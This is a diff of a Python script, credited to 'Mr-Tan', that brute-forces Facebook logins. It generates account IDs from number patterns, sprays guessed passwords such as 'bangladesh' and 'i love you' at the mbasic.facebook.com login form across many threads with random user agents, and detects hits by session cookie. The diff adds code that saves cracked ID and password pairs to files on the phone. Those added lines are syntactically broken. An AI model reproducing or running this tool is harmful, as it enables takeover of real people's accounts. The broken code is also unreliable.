@@ -1,26 +1,19 @@
+#-----------------------script writen by Mr-Tan---------------------------
 import requests, os, re, bs4,platform,sys,json,time,random,datetime,subprocess,threading,itertools,base64,uuid,zlib,string,mechanize
-from datetime import datetime
-from bs4 import BeautifulSoup
-from bs4 import BeautifulSoup as sop
-from concurrent.futures import ThreadPoolExecutor as Tan
-from requests.exceptions import ConnectionError
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup
-import requests as ress
-from datetime import date
-from datetime import datetime
-from time import sleep
-from time import sleep as waktu
 try:
     import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
-    import mechanize
-    from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+except:
+    os.system("pip install requests")
+try:
+    import bs4
 except:
     os.system("pip install bs4")
+try:
+    import rich
+except:
     os.system("pip install rich")
+
+from concurrent.futures import ThreadPoolExecutor as Tan
 logo=f'''\x1b[38;5;48m
           _ ______ 
    ____ _(_) __/ /_
@@ -91,7 +84,7 @@ def random_crack():
         print('\033[1;37m━━━━━━━━━━━━━━━━━━━\x1b[38;5;48m')
         for guru in user:
             uid=code+tanim+rikta+guru
-            pwx=[code+tanim+rikta+guru,rikta+guru,tanim+guru,code+tanim+rikta,'bangladesh','Bangladesh','bangla','Bangla']          
+            pwx=[code+tanim+rikta+guru,rikta+guru,tanim+guru,code+tanim+rikta,'bangladesh','Bangladesh','bangla','Bangla','i love you']          
             me.submit(crack,uid,pwx,count)
             
 def crack(uid,pwx,count):
@@ -104,7 +97,7 @@ def crack(uid,pwx,count):
             session=requests.Session()
             love = random.choice(ugen)
             sys.stdout.write(f"\r\033[1;31m[\x1b[38;5;48m𝐅𝐈𝐍𝐃𝐈𝐍𝐆\033[1;31m]\033[1;37m-\033[1;31m[\x1b[38;5;48m%s\033[1;31m]\033[1;37m-\033[1;31m[\x1b[38;5;48mOK\033[1;31m:\x1b[38;5;48m%s\033[1;31m]\x1b[38;5;48m "%(loop,len(oks))),sys.stdout.flush()
-            free_fb = session.get('https://m.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log={
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -115,7 +108,7 @@ def crack(uid,pwx,count):
             "email":uid,
             "pass":key,
             "login":"Log In"}
-            header= {'authority':'m.facebook.com',
+            header= {'authority':'mbasic.facebook.com',
              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
              'accept-language': 'en-US,en;q=0.9',
              'cache-control': 'max-age=0',
@@ -133,14 +126,16 @@ def crack(uid,pwx,count):
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1',
              'user-agent': love,}
-            dca=session.post("https://m.facebook.com/login/device-based/regular/login/?refsrc",data=log,headers=header).text
+            dca=session.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc",data=log,headers=header).text
             geta=session.cookies.get_dict().keys()
             if 'c_user' in geta:
                 print(f"\r\033[1;31m[\x1b[38;5;48mTan-ok\033[1;31m]\x1b[38;5;48m {uid} \033[1;37m┼\x1b[38;5;48m {key}")
+                open('\sdcard\Tan-oks.txt','a').write(+uid+' | '+key+)
                 oks.append(uid)
                 break
             elif 'checkpoint' in geta:
                 print(f"\r\033[1;31m[Tan-cp] {uid} ┼ {key}")
+                open('\sdcard\Tan-cps.txt','a').write(+uid+' | '+key+)
                 cps.append(uid)
                 break            
             else:
